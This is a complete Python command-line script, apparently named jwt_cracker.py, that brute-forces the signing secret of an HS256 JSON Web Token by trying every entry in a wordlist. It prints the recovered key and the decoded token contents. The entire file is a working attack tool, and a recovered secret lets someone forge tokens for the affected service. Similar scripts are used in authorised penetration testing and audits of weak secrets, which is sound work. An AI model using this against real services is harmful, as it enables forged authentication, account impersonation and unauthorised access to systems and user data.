import jwt
import sys

def try_crack_jwt(token, wordlist):
    with open(wordlist, 'r') as file:
        for secret in file:
            secret = secret.strip()  # Remove any whitespace or newline characters
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] Success: Secret key is '{secret}'")
                print(f"Decoded JWT: {decoded}")
                return True
            except jwt.InvalidTokenError:
                continue
    print("[-] Failed: No valid key found in the wordlist.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python jwt_cracker.py <jwt_token> <wordlist>")
        sys.exit(1)
    
    token = sys.argv[1]
    wordlist = sys.argv[2]
    
    try_crack_jwt(token, wordlist)
